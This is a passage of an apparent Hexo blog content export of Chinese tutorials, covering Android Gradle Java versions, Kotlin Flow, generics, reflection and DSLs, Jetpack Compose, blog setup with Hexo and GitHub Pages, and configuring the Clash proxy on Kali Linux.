至于compileOptions和kotlinOptions的区别是由于，在一个项目中，我们通常可以看到kotlin和java混用，而这就是分别对于他们的编译器版本
对于sourceCompatibility通常指的是我们能够使用到java版本，通常你可以设置为更高级的版本，但那并不意味这你看也i使用这些高版本的java功能。因为实际上android不一定能够支持这些高版本的java。例如android14才最高·1支持java17的版本，而android13以前都最高只支持java11的版本。
targetCompatibility在这里他指的是java bitecode version。你甚至可以设定为18，因为他不会对你选择的java版本的语言功能造成影响。而且java bitecode version通常可以和旧版本的兼容
kotlinOptions中的jvmTarget指的就是target的版本，也就是java bitecode version
版本冲突问题通常对于你引入的library，或许他们支持的字节码版本是jvm18.而你的android的目标字节码版本是jvm8。那么他们很可能是兼容的，但这并不一定，也会有例外
很多时候的问题是因为gradle的版本问题，因为到了gradle8之后，他便必须使用jdk17以上
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>flow中merge，combine，zip的区别</title>
    <url>/posts/18eac30d/</url>
    <content><![CDATA[fun main() &#123;    var flow1 = (1..10).asFlow().onEach &#123; delay(300L) &#125;    var flow2 = (11..20).asFlow().onEach &#123; delay(1000L) &#125;    runBlocking &#123;        flow1.combine(flow2) &#123; n1, n2 -&gt;            println(&quot;combine  $n1:$n2&quot;)        &#125;.collect()        flow1.zip(flow2) &#123; n1, n2 -&gt;            println(&quot;zip  $n1:$n2&quot;)        &#125;.collect()        merge(flow1, flow2).onEach &#123; it -&gt;            println(&quot;merge $it&quot;)        &#125;.collect()    &#125;&#125;
结果如下：&#x2F;&#x2F;在第一轮时，combine会等待两个流中都传入值才会继续进行，而后进行只需判断是否有值即可。combine  3:11combine  4:11combine  5:11combine  6:11combine  6:12combine  7:12combine  8:12combine  9:12combine  9:13combine  10:13combine  10:14combine  10:15combine  10:16combine  10:17combine  10:18combine  10:19combine  10:20zip  1:11zip  2:12zip  3:13zip  4:14zip  5:15zip  6:16zip  7:17zip  8:18zip  9:19zip  10:20merge 1merge 2merge 3merge 11merge 4merge 5merge 6merge 12merge 7merge 8merge 9merge 13merge 10merge 14merge 15merge 16merge 17merge 18merge 19merge 20
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>flow</tag>
        <tag>kotlin</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+githubPage+又拍云 搭建自用博客</title>
    <url>/posts/2b6c1927/</url>
    <content><![CDATA[
首先，再看这篇博客之前，我希望可以好好明确搭建博客的意义。是为了记录自己的生活，学习。或者分享自己的经验等其他各种原因。而不是为了白嫖而白嫖。那样子你的博客是写不下去的。

搭建博客这里简单说一下搭建博客的流程。

首先先再本地安装环境，包括node，hexo，git，具备一个写博客的编辑器（如typora，vscode）之类的
有一个github账号。
有自己的域名（没有也行，但是有自己的域名再搭配上自己的博客会更有成就感。至少我们可以和别人装逼。我们有自己的博客网站。）
经过一系列的繁琐操作，部署完成后
开始写你的博客

安装node，hexo，git安装nodejs进入官网,选择最新版的安装包进行下载下载后，直接安装检测安装是否安装按住win+R输入cmd进入命令行界面。 输入node+v如果出现node的版本号，即安装完成
他不用换源也挺快的，所以这里不演示换源的方法这里我推荐另一种安装node的方法，就是使用nvm，它是一个可以管理多个node环境的工具。也可以很方便的换源。这也是我自己一直在使用的。（可以看我另一篇文章）
安装git进入下载界面.选择你需要的版本进行下载。下载后按需进行安装。如果看不懂英文，可以便翻译便安装。也可以选择按照默认的进行安装，也可以看看网上更加详细的git安装教程。可能会有的不同的就是，我会把git集成到PATH中，这样cmd中也可以使用git。而不用使用git bash那个不好看的那个小黑框配置ssh key配置ssh key可以以后再提交时不用再进行身份验证,省去了很多麻烦.

在命令行输入下面这段代码来生成非对称密钥ssh-keygen -t ed25519 -C &quot;your_email@example.com&quot;他会自动保存在C:&#x2F;users&#x2F;{用户名}&#x2F;.ssh中,一个是私钥,一个带有.pub后缀的是公钥
然后进入github设置中选择”新增一个密钥”,把你的公钥输入进去.
校验是否配置完成在命令行输入ssh -T git@github.com如果有正确的结果显示就没有问题(就是一个yes什么什么的.)


这儿是官方说明

安装hexo选择一个你喜欢的目录(例如&#x2F;hexo-blog).然后执行如下命令:
全局安装hexo工具npm install -g hexo-cli校验hexo是否安装完成hexo -v在指定的文件夹进行hexo初始化hexo init然后直接启动服务hexo s查看localhost:4000就可以看到你已经开启的服务了(这里常用来校验你写的博客,或者样式配置是否有问题)
这些是最常用的命令
# 清除./public下的缓存hexo clean# 生成public目录,并将文件都重载hexo g# 将./public目录下的内容部署到你配置的github上hexo d# 开启一个hexo的本地服务hexo s

官网的所有命令
到此为止你的hexo已经可以启动了,这就是最基础的教学.你还可以添加别人写好的很好看的主题.但我不会过多说明,我这里只演示butterfly主题的配置过程.
主题进阶
这里是butterfly的官网和项目地址官方说明 https://butterfly.js.org/项目地址 https://github.com/jerryc127/hexo-theme-butterfly

修改 Hexo 根目录下的 _config.yml，把主题改为 butterflytheme: butterfly更多的样式配置我就不说明了,你直接看官方文档说明会更好.
配置github Page首先要说明的是,Github Pages可以配置无限多个页面,你可以把他当作简化版nginx,他可以帮你部署前端页面.

在任何页面的右上角，选择 ，然后单击“新建存储库”****。

GitHub 下拉菜单的屏幕截图，其中显示了用于创建新项的选项。 菜单项“新建存储库”用深橙色框标出。

使用“所有者”下拉菜单选择你想要拥有存储库的帐户。新 GitHub 存储库的所有者菜单的屏幕截图。 菜单显示两个选项：“octocat”和“github”。输入仓库的名称和说明（可选）。 如果要创建用户或组织站点，则存储库必须命名为 .github.io 或 .github.io。 如果您的用户或组织名称包含大写字母，您必须小写字母。 有关详细信息，请参阅“关于 GitHub Pages”。


然后你在仓库中创建一个index.html并任意编写一段开场白(hello world).等他完成部署后,查看github为你生成的页面&lt;user&gt;.github.io.看到你自己的开场白就算完成github page的使用.

对于github page的使用,这是最常用的.你会有一个github给你使用的二级域名.而他的其他用法,你可以在其他仓库创建一个分支,一般名字为gh-pages.然后这个分支也会自动为你部署一个page,他的访问地址是&lt;user&gt;.github.io/&lt;仓库名&gt;/.但是一般都用上面哪一种.也可能会有更多的方法,但是我没学.我也不知道.

hexo+github开始上传自己的博客hexo配置以及使用有两个配置文件：
一个是根目录下的_config.yml称为站点配置文件一个是themes/landscape/_config.yml称为主题配置文件(默认主题：landscape)
配置根目录下的_config.yml
url: https://yourname.github.io/theme: butterfly #选择你想用的主题，我用的是butterflydeploy:    type: git # 不要使用github    repo: git@github.com:&lt;user&gt;/&lt;user&gt;.github.io.git # 使用ssh连接    branch: main # 默认main分支#   message: add new blog # 自动部署commit备注，可不填

然后执行
hexo cleanhexo ghexo d

你的所有博客内容就会被推送到github上,稍等一会,你就可以在自己的网站上看到自己布置的博客了.
写博客这里我就不废话,直接看官方说明https://hexo.io/zh-cn/docs/writing.html至此你就已经完成hexo+github搭建博客的全过程,结束
好吧,还有内容.
图床服务说明一下,你可以用,也可以不用.在你写博客的时候,你会经常需要在文章中粘贴图片.hexo会有对应的插件,当你写博客时,他会帮你把图片保存在你的某个img文件夹里头,然后再生成对应的调用这个图片的md语句.可是,我不是单纯从hexo开始的,我最开始用过wordpress(太笨重,启用了),typecho(服务器到期了,迁移的时候,出了毛病),memos(这个是最轻量化的,但他对标的是笔记本,而不是博客.)最后为了把一些文章进行迁移,还有图片也需要进行迁移,巨麻烦.尽管我都搞完了,但是这让我痛定思痛.不如统一管理吧.
这里推荐两个:七牛云,又拍云.

七牛云:  他有免费的额度.但是他只支持http.如果你要使用https需要额外付费.而使用https往往是我们写博客时所必要的(也没说必要,只是看着舒服很多.嘿嘿~).所以我并不推荐七牛云.如果你只用http那就随你了.

如果你的博客使用了https,那么他就不能读取这些用http加载的图片文件,这是规定


又拍云:  他就很好的满足了我的要求,他支持免费的https用来进行云存储.而且他对免费的使用不仅仅是多少额度的问题.他会给你67元代金券限期一年,每年都会发放,你不仅可以用来做oss对象存储,还可以给自己的github page做cdn加速.这就很香~.这样国内也可以很方便的访问到.要用它,你得在页面下面加一些说明:我这里直接给出我的:
  本网站由 &lt;a href=&quot;https://www.upyun.com/?utm_source=lianmeng&amp;amp;utm_medium=referral&quot;&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/xingjiahui/CDN/又拍云_logo.png&quot; align=&quot;absmiddle&quot; width=&quot;59px&quot; height=&quot;30px&quot; /&gt;&lt;/a&gt; 提供CDN加速/云存储服务

    就像这样子.

但是呢,说归说,你要在国内提供网站服务,你总得有个自己的域名,这个域名还得备案.这个就是使用的前提,你得备案.(要么自定义域名+备案)(要么就用&lt;user&gt;.github.io)



又拍云的使用细则欸,我就不写了,反正我也是看别人的学的喏 https://cloud.tencent.com/developer/article/1834572看这篇文章,你就会搞啦.就是这样.
线上写博客我们不可能一直在一台电脑上写博客,我们还会有身上没有电脑,或者在使用公共的电脑,这样就会很不方便写博客.于是乎,你可以这样:把自己的hexo博客上传到github上,随便取名,然后你使用github的代码空间,github会每个月免费120个小时的使用时间,pro用户有180个小时.你有2h8g和4h16g的配置可选,他会为你在linux部署一个vscode然后通过web链接.这样你在线上也可以痛快的写代码了.而且你还可以登录,他可以同步你本地所有设置.你需要hexo d的时候也可以像我上文写的那样,部署一个ssh密钥,通过ssh链接部署.然后再提交到你的&lt;user&gt;.github.io仓库里.
就是这样,喵~当然也有另一种做法,就是使用Github Action.但是小子愚钝,弄不明白,这是大佬的文章https://cloud.tencent.com/developer/article/2119710
你们能搞定最好,搞不定.向我那样子写博客也是可以的哦.
]]></content>
      <categories>
        <category>白嫖</category>
      </categories>
  </entry>
  <entry>
    <title>jetpack compose(入门)</title>
    <url>/posts/d2b22915/</url>
    <content><![CDATA[为什么我们需要一个新的UI 工具?原因是 View.java 这个类实在是太大了，有太多的代码，它大到你甚至无法在Githubs上查看该文件，因为它实际上包含了 30000 行代码，这很疯狂，而我们所使用的几乎每一个Android UI 组件都需要继承于View.
Compose API 的原则
Compose是一个声明式UI系统。 他的一切都是函数
在Compose的世界中，没有类的概念，全都是函数，并且都是顶层函数，因此不会有任何继承和层次机构问题。
组合优于继承
信任单一来源

Compose运行Core
绘制(Draw) Draw 给了你访问Canvas的能力，因此你可以绘制你要的任何自定义View
布局(Layout) 通过布局，我们可以测量事物并相应地放置视图
输入(Input)开发人员可以通过输入访问事件并执行手势
语义(Semantics) 我们可以提供有关树的语义信息

FoundationFoundation的核心是收集上面提到的所有内容，并共同创建一个抽象层 ，以使开发人员更轻松调用
Material在这一层。所有的Material组件将会被提供，并且我们可以通过提供的这些组件来构建复杂的UI
插槽API插槽API的出现是为了给开发人员留出了很多空间，以便他们可以执行所需的任何自定义操作
创建compose函数Jetpack Compose是围绕 composable 函数来构建的。这些函数使你可以通过描述应用程序的形状和数据依赖，以编程方式定义应用程序的UI，而不是着眼于UI的构建过程。要创建 composable 函数，只需要在函数名前面加上一个@composable注解即可。该注解必须用于不接受参数的可组合函数。因此，您无法直接预览 MessageCard 函数，而是需要创建另一个名为 PreviewMessageCard 的函数
布局在Jetpack Compose中，你可以通过从其他 composable 函数中调composable 函数来构建UI层次结构。
column要使重叠绘制的 Text 文本能够垂直排列，我们就需要使用到 Column 函数在调用 Column（） 时，可以传递参数给 Column（） 来配置 Column 的大小、位置以及设置子元素的排列方式。
Material Design首先，使用在您的项目中创建的 Material 主题 ComposeTutorialTheme 和 Surface 来封装 MessageCard 函数。ComposeTutorialTheme是定义在你的ui/theme.kt中的，在 @Preview 和 setContent 函数中都需要执行此操作。这样一来，可组合项即可沿用应用主题中定义的样式，从而在整个应用中确保一致性。Material Design 是围绕 Color、Typography、Shape 这三大要素构建的。您将逐一添加这些要素。
重组Compose 应用通过调用可组合函数将数据转换为界面。如果您的数据发生变化，Compose 会使用新数据重新执行这些函数，从而创建更新后的界面，此过程称为重组。Compose 还会查看各个可组合项需要哪些数据，以便只需重组数据发生了变化的组件，而避免重组未受影响的组件。

更改此变量不会触发重组的原因是 Compose 并未跟踪此更改。此外，每次调用 Greeting 时，都会将该变量重置为 false。

状态提升在可组合函数中，被多个函数读取或修改的状态应位于共同祖先实体中，此过程称为状态提升。“提升”意为“提高”或“升级”。使状态可提升，可以避免复制状态和引入 bug，有助于重复使用可组合项，并大大降低可组合项的测试难度。相反，不需要由可组合项的父级控制的状态则不应该被提升。可信来源属于该状态的创建者和控制者。
保留状态var shouldShowOnboarding by rememberSaveable &#123; mutableStateOf(true) &#125;运行应用，旋转屏幕，更改为深色模式，或者终止进程。除非您之前退出了应用，否则系统不会显示初始配置屏幕。
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>compose</tag>
      </tags>
  </entry>
  <entry>
    <title>jetpack compose 修改app字体</title>
    <url>/posts/85ecf67b/</url>
    <content><![CDATA[
如果你使用的是xml来写UI的话，可以查看这个文章，里面有很详尽的关于app修改字体的方法。

这里主要说明的是使用jetpack compose进行开发时，你修改字体需要设置你的type.kt![](https://image.zfxt.top/hexo-blog/jetpack compose 修改app字体-2023-12-05-06-45.png)在其中将默认字体改为你自己定义的字体![](https://image.zfxt.top/hexo-blog/jetpack compose 修改app字体-2023-12-18-31-55.png)![](https://image.zfxt.top/hexo-blog/jetpack compose 修改app字体-2023-12-05-00-34.png)然后即可完成字体的修改
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>jetpack compose</tag>
        <tag>字体替换</tag>
      </tags>
  </entry>
  <entry>
    <title>kali中使用clash作为代理</title>
    <url>/posts/6d6854ee/</url>
    <content><![CDATA[一般的桌面级OS，如ubuntu，centos。他们都会有图形化的代理配置如下图所示。但是，在kali中他并没有这个配置。因此你需要通过命令行界面去配置代理。这里以clash为例clashclash是一个广泛使用的代理工具，可以跨平台使用，兼容windows，linux，mac。
clash的安装你可以在这个链接中获得clash的最新版本这里是dashboard的发行版本
这里演示在linux下安装clash的过程
Linux这次演示使用clash+dashboard作为代理服务并配合机场使用

dashboarddashboard是一个ui界面，用来管理clash，他更多用于云服务器，一般默认为9090端口，可以从外界访问，从而控制代理服务。  先在用户目录下安装一个clash文件夹，并进入到其中
mkdir clash &amp;&amp; cd clash
  然后再目录下，把机场给的config.yaml下载下来，可以使用wget
wget &quot;机场给你的订阅链接&quot; -O config.yaml
然后从github上获取clash和dashboard的二进制文件。

建议从github上获取最新的链接，因为在某个版本前的clash已经出现了漏洞问题

wget https://github.com/Dreamacro/clash/releases/download/v1.11.12/clash-linux-amd64-v1.11.12.gzwget https://github.com/haishanh/yacd/releases/download/v0.3.7/yacd.tar.xz



然后解压两个文件
gzip -d clash-linux-amd64-v1.11.12.gztar -xvf yacd.tar.xz &amp;&amp; mv public dashboard
给clash添加执行权限
chmod +x clash
编辑config.yaml配置
port: 7890socks-port: 7891allow-lan: truemode: Rulelog-level: infosecert: 123456 // 增加这一行, 如果你希望你的clashweb要密码访问可以在这块配置密码, 如果不需要直接注释掉即可external-ui: dashboard // 增加这一行external-controller: 0.0.0.0:9090
然后执行./clash -d .即可运行起来。

然后配置代理服务。

如果只是暂时使用```shell  export https_proxy=http://127.0.0.1:7890  export http_proxy=http://127.0.0.1:7890  export all_proxy=socks5://127.0.0.1:7891
- 也可以配置到~./bashrc中    然后source ./bashrc需要关闭代理可以```shunset http_proxyunset https_proxyunset all_proxy
如果你没有办法下载到以上配置项，这里给你提供一个压缩包，你解压后，赋予权限，然后带上机场给你的配置项就可以使用了。clash一键包

服务器linux如果是在服务器上进行部署，那么以上的配置已经足够，因为你的服务器全天不关机，不需要去考虑是否需要为clash配置一个守护进程。更多的内容可以查看我的另一篇文章配置clash快速启动和关闭
桌面级linux桌面级比如我正在使用的kali，因为他不能便携的使用代理服务。因此我将会推荐使用以下的配置。
首先需要为clash配置一个守护进程，让他可以简单的启动以及开机自启动配置启动项
vim /etc/systemd/system/clash.service
然后填入以下内容
复制[Unit]Description=Clash serviceAfter=network.target[Service]Type=simpleUser=louis（你的用户名）#下面这个启动项填三个参数，第一个是你的文件位置，然后是-d，最后是文件所在的目录。ExecStart=/home/zfxt/clash/clash -d /home/zfxt/clashRestart=on-failureRestartPreventExitStatus=23[Install]WantedBy=multi-user.target
加载服务
systemctl daemon-reloadsystemctl enable clashsystemctl start clashsystemctl status clash
然后在/etc/enviroment添加代理的配置
export https_proxy=http://127.0.0.1:7890export http_proxy=http://127.0.0.1:7890export all_proxy=socks5://127.0.0.1:7891
然后source /etc/enviroment即可使用代理了
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>clash</tag>
      </tags>
  </entry>
  <entry>
    <title>kotlin(DSL)</title>
    <url>/posts/ab061c7f/</url>
    <content><![CDATA[领域特定语言和通用编程语言通用编程语言：有一系列足够完善的能力解决几乎所有计算机能解决的问题。领域特定语言（DSL）：专注在特定任务上，放弃与之无关的功能。如SQL，正则表达式。他们趋向于解决特定的问题，但对于整个应用程序，他们是无法构造的。
DSL趋向于声明式，而通用编程语言趋向于命令式。他们的区别在于：声明式语言会将想要的结果和执行细节留给解释他的引擎。通常只需要优化一次。而命令式语言要求每一个操作都被独立优化。通常声明式会更有效率一些。而这就带来了一些缺点，比如SQL不能直接嵌入到其他语言中一起使用。单独的语言也需要单独的学习。
DSL风格的API和普通APIDSL的API往往会更加整洁而且通过DSL比单独构造出来的API更具表现力和更适宜工作。
内部DSL通过使用主要语言的特定方式，同时保留独立语法的DSL的主要优点。
DSL的结构通常DSL和API没有明确定义的边界。判断的标准往往是，DSL有着特有的结构或者说文法。一般的API相互调用直接也没有维护上下文。调用时也没有特定语法结构：这种一般被称为命令查询API。与之不同的，DSL的方式会存在一个结构。在kotlin DSL中。结构通常采用嵌套的lambda表达式，或者链式方法创建的。这种文法使我们能够将内部DSL称为一门语言。
带接收者的lambda这是kotlin中的一个强大特性。我们以buildString为例：
fun buildString(buiderStringAction: (StringBuilder) -&gt; Unit): String &#123;    val sb = StringBuilder()    buiderStringAction(sb)    return sb.toString()&#125;fun main() &#123;    val s = buildString &#123;        it.append(&quot;Hello, &quot;)        it.append(&quot;World!&quot;)    &#125;    println(s)&#125;
这段代码很好理解。但是我们使用时，必须要通过显示的使用it（或者其他你显示定义的参数名)。才能完成传值。如果我们想去掉it.前缀，用append代替it.append。要做到这一点，就需要使用带接受者的lambda。
fun buildString(buiderStringAction: StringBuilder.() -&gt; Unit): String &#123;    val sb = StringBuilder()    sb.buiderStringAction()    //下面这个方法在这任然可以使用    //buiderStringAction(sb)    return sb.toString()&#125;fun main() &#123;    val s = buildString &#123;        append(&quot;Hello, &quot;)        append(&quot;World!&quot;)    &#125;    println(s)&#125;
这就是带接受者的lambda。它的append实际上就是this.append但是this可以省略。这个样式是不是非常像扩展函数？通过扩展函数，不需要显示的修饰符就可以访问一个外部类的成员。如stringBuild使用append方法。实际上一个扩展函数类型描述了一个可以被当作扩展函数来调用的代码块。再次重申，这里的 builderAction 并不是StringBuilder 类的方法，它是一个函数类型的参数，但可以用调用扩展函数一样的语法调用它。
invoke约定它的作用是可以把类当函数一样使用。当你声明了operator invoke方法时，你直接调用类，作为方法，然后它会自动执行invoke中的函数体，如下：
class People&#123;    operator fun invoke(name:String)&#123;        println(name)    &#125;&#125;fun main() &#123;    People()(&quot;hzt&quot;)    val hzt = People()    hzt(&quot;SB&quot;)&#125;
以上语法都是正确的，这就是invoke约定。这也可以解释为什么lambda函数可以直接在后头加个小括号直接调用。因为lambda函数都会转化为Function类。然后里面会有一个内置的方法invoke会存储你的lambda函数体。而invoke用到的地方，大大优化了DSL，如下图：
infix声明infix表示它可以使用中缀调用。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>koltin(高阶函数)</title>
    <url>/posts/9e2ac398/</url>
    <content><![CDATA[高阶函数定义高阶函数就是以另一个函数为参数，或者返回值为函数的函数。例如常用的filter,map,with等都是高阶函数
函数类型

函数类型必须显示的表示出来，如Unit在普通函数中可以隐藏。但是在函数类型的声明中，必须完整的写出来。
当你已经声明了函数类型后，你再写lambda函数，就可以省略掉lambda函数里的参数类型，而直接写他的参数名。
同样的，函数类型也有可空的。但是有两点区分 val testNull1: (Int) -&gt; Int? = &#123; null &#125;val testNull2: ((Int) -&gt; Int)? = nullval testError: (Int) -&gt; Nothing = &#123;	throw Exception(&quot;Error&quot;)&#125;
一个是返回类型的可空，一个是函数类型的可空。

在java中使用函数类其背后原理为：函数类型在编译后会被声明为一个普通的接口，一个函数类型的变量就是FunctionN的一个实现。kolitn定义了一系列接口，包括不同数量的参数，Function0(没有参数的函数)、 Function1&lt;P1,R&gt;(一个参数的函数)，等等。每个接口都实现一个invoke方法，这个方法就是lambda函数的函数体
//java8后的版本        var calculate = new Calculate((Integer a, Integer b) -&gt; a - b);        System.out.println(calculate.calculate(1, 2));        //java8以前        var calculate1 = new Calculate(                new Function2&lt;Integer, Integer, Integer&gt;() &#123;                    @Override                    public Integer invoke(Integer integer, Integer integer2) &#123;                        return integer + integer2;                    &#125;                &#125;        );        System.out.println(calculate1.calculate(1, 2));


函数类型的参数也可以设置一个默认值
函数也可以返回一个函数，通常用于返回一个常用的逻辑。
也可以通过lambda函数实现合并提取出重复代码，简化整体。

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin(注解和反射)</title>
    <url>/posts/6fc70aaa/</url>
    <content><![CDATA[注解使用注解使用注解只需要把@符作为名字的前缀，并放在需要注解的代码元素前面。

@Test是一个好用的注解,他可以用来测试一个方法的执行。
@Deprecated这个注解的作用是，声明那些方法已经被弃用，淘汰了。它可以与IDE一起使用。在kotlin中，他还使用了replaceWith参数加强了他。可以提供一个替代者，并且转移参数。（一条不推荐使用的消息，和一个替代者的模式）

注解能够拥有的参数基本数据类型，字符串，枚举，类引用，其他注解。他与java的不同：

要把一个类指定为注解实参，必须在类后面加上::class，表示这个类的反射。
要把另一个注解添加为实参，必须强调注解前的@。
要把一个数组指定为实参，必须使用arrayOf函数
注解使用的参数必须是已知的。也就是常数

注解目标因为一个kotlin的声明往往对应着java的多个声明。如一个属性，java中只会是一个普通的字段。而kotlin中还包括set，get方法和一些隐藏的参数。所以使用点目标可以具体确定是那个代码接受注解。Kotlin 支持的使用点目标的完整列表如下• property一 Java 的注解不能应用这种使用 目标• field 一 为属性生成的字段• get 一一属性的 getter• set 一一  属性的 setter• receiver 一一 扩展函数或者扩展属性的接收者参数。• param一一构造方法的参数。• setparam一一属性 setter 的参数• delegate 为委托属性存储委托实例的字段• file 一一包含在文件中声明的顶层函数和属性的类。
用注解控制生成的javaAPI可以通过注解改变kotlin默认生成的javaAPI。而自己设定@JvmName–改变由kotlin生成的java方法或字段@JvmStatic–将方法或属性暴露为java中的静态内容@JvmOverloads–将kotlin编译器中带默认参数值的方法或构造方法自动重载为多个方法@JvmField–把一个属性暴露为一个没有访问器的公有java字段
声明注解只需在类前添加annotation也就是annotation class，而且kotlin编译器禁止注解类有实体。也就是不能有大括号。只能有部分参数。对于kotlin的注解，他有一个特殊的属性：name，他与java中注解的一个属性类似：value。这个属性不用强制写key-value的模式。而是可以直接写值。
元注解顾名思义，即使可以添加在注解类上的注解，他的作用是用来控制一个注解类的使用。最常用的就是@Target。他可以用来控制注解能用在哪些位置上。比如
@Target(AnnotationTarget.PROPERTY)annotation class MyAnnotation
这个注解就只用使用在属性Property上。相应的还有类、文件、函数、属性、属性访 所有 表达式 等等。

对于java，他不能使用property的属性。所以你必须在声明一个field才能供java使用。


使用类作为注解的参数，通常是使用他的反射，而且他还可以使用泛型类，包括他的投影
反射一种在运行时动态的访问对象属性和方法的方式。而不需要提前知道这些属性是什么。通常你访问一个对象的方法或属性时，程序的源代码会引用一个具体的声明，编译器会静态的解析这个引用，并确保它是存在的。但有时候，你需要编写能够使用任意类型的对象的代码，或者只能在运行时才能确定要访问的方法和属性。JSON序列化就是这样的。
两种反射
java的反射。定义在java.lang.reflect中，因为kotlin会被编译为字节码，java反射完全支持它，这意味着使用了反射API的java库完全兼容kotlin代码。
kotlin的反射。定义在kotlin.reflect中，他让你访问一些java中不存在的概念，如属性和空类型。但有些情况你任然会去使用java的反射
kotlin的反射没有仅限于kotlin类，而是使用同样的APi访问任何用JVM语言编译成的类。



kotlin反射API：KClass，KCallable,KFunction,KProperty所有反射类的继承关系如上

KClass既可以表示类，也可以表示所有对象。
class People(val name: String, val age: Int) : Animal() &#123;       fun print() &#123;           println(&quot;name:$name,age:$age&quot;)       &#125;   &#125;   val people = People(&quot;小明&quot;, 18)   val kclass = people.javaClass.kotlin   println(kclass.simpleName)   kclass.members.forEach &#123;       println(it.name)   &#125;
你可以通过获取反射然后得到他的所有成员和类名，还有更多方便的方法，这里不细说

KFunction它接受一个方法的反射，然后它提供了一个方法call()可以用来调用这个方法，而且call()的参数是可变参数，无论你的方法有几个参数他都能够实现。但是这种方法不安全，它可能会导致类型不安全，或者参数数量不对等错误。因此kotlin提供了另一种方法，invoke()它会根据你的方法参数数量和类型而确定自己的参数。当然它需要KFunction1,KFunction2等等这些类型。这些类型被称为合成的编译器生成类型，它不会在包内声明。这意味着你可以使用任意数量的参数，而且它减小了jar包的尺寸。

KFunction和Function有着类似的属性。当然他们也都可以接受lambda函数和::函数的函数体。


KProperty首先，它必须接受一个属性，而不是普通的变量。其次你使用它获取属性就是通过::来获取的，也可以类似于lambda函数。因此你使用这个属性时，必须得传入一个实例进去，或者绑定引用。如果是全局的，就不需要特定的传入一个实例。


]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin(泛型)</title>
    <url>/posts/38e6998/</url>
    <content><![CDATA[泛型
泛型允许你定义带类型形参的类型。
但是当这个类型的实例被创建出来时，类型形参将会被替换为类型实参的具体类型。即T,E这样的类型形参会被替换为具体的String，Int之类的。
此外，kotlin的编译器可以根据你给定的类型自动推导出所需的类型实参。但是如果你没有给定相关的类型，即编译器无法判断。如你只给定了一个空数组。此时你必须显式的说明你的类型实参是什么(就是必须写清楚&lt;&gt;中的参数类型)
注意，因为java中，泛型是在1.6后的版本才被引入。所以为了和老版的java兼容，他允许使用没有类型参数的泛型类型–所谓的原生态类型。而kotlin不然，他必须声明泛型的类型。



泛型类型和属性如图所示，你必须可以接受一个类型实参进入，用来代替T。
fun &lt;T&gt; testFanxing(x: T): T &#123;    println( x.hashCode())    return x as T&#125;
他不仅可以适用与函数，也可以适用于属性
val &lt;T&gt; List&lt;T&gt;.lastIndex:T    get() = 1 as T
但是如果作为非扩展的属性，他将意义不大，因此kotlin编译器拒绝了对普通属性的泛型化。只有扩展属性才能泛型化。
对于类也是不必多言，他同样可以适用于泛型。
类型参数约束我们可以约束泛型的范围，有两种方法：

为泛型添加上界约束fun &lt;T:Number&gt; sum(a:T, b:T)&#123;    println(a)    println(b)&#125;
这样子泛型直接为数字类型。还有其他的例子：如果要限定多个参数类型，需要使用where关键字fun &lt;T&gt; sum(a:T, b:T) where T:Appendable,T:Number&#123;    println(a)    println(b)&#125;

运行时泛型：擦除和实化类性参数JVM上的泛型都是通过类型擦除实现的，就是说泛型类实例的类型实参在运行时是不保留的。
运行时泛型和java一样，kotlin的泛型在运行时也会被擦除。这意味着即便你创建一个List的类，在运行时也只能看到List而已。你无法判断他具体是什么类型，只能判断他是一个List。如果你尝试去判断一个list类具体是什么类型。他只会抛出错误，“无法检查一个被擦除的类”擦除也是有好处的，它可以降低应用程序的内存用量，因为保存在内存的类型信息更少了
如果要判断一个类是不是list而不是set或其他的集合类，可以使用星号投影来做检查：
 if(list is List&lt;*&gt;)&#123;&#125;


注意，在 as as ？转换中仍然可以使用一般的泛型类型 但是如果该类有正确的基础类型但类型实参是错误的，转换也不会失败，因为在运行时转换发生的时候类型实参是未知的。因此，这样的转换会导致编译器发出“unchecked cast ”（未受检转换）的警告。这仅仅是一个警告，你仍然可以继续使用这个值，就当它拥有必要的类型，如下所示。

也就是说，如果你要把set类型强行转化为list&lt;*&gt;类型，那么他的基础类型转化就是错误的，他会直接抛出一个IllegalArgumentException。表示参数错误。因为他也无法判断你的类型实参是否正确。而如果你是从list转化为list那么他将会抛出ClassCastException。
带实化类型参数的函数在一般的情况下，我们的类型实参都会被JVM擦除掉，而这只有一种情况可以避免：内联函数。内联函数可以实化类型参数。inline函数的作用此时被挖掘了出来，他将不止能够提高lambda函数的运行效率，也可以把参数类型实化。只需要
inline fun&lt;reified T&gt; isA(value: Any)=value is T
添加inline和refied关键词就可以。然后他就可以正常检查数据类型是否正确。注意，带 reified 类型参数的 inline 函数不能在 Java 代码中调用。
实化类型参数可以代替引用类如果是使用普通的类，那么他就无法提取T的反射。只有实化才能使用。
实化类型参数的限制
变型、泛型和子类型化为什么会出现变型：
fun main()&#123;//只读    val list = listOf(&quot;abc&quot;,&quot;123&quot;)    fun listOnlyRead(list: List&lt;Any&gt;)&#123;        println(list.joinToString())    &#125;    listOnlyRead(list)//可变    val mutableList = mutableListOf(&quot;abc&quot;,&quot;123&quot;)    fun listChange(list: MutableList&lt;Any&gt;)&#123;        list.add(12)    &#125;    listChange(mutableList)&#125;
对于只读的list集合，我们把一个List的变量传递给List也是安全的。但是如果我们传递的是可变的，那么他将会出现异常，因为我们给一个Stirng类型的list添加int类型的数据。当然，这个错误已经被编译器捕获，他不会让我们编译成功。因此，才会有对变型的讨论，避免出现类型转换后的报错问题。
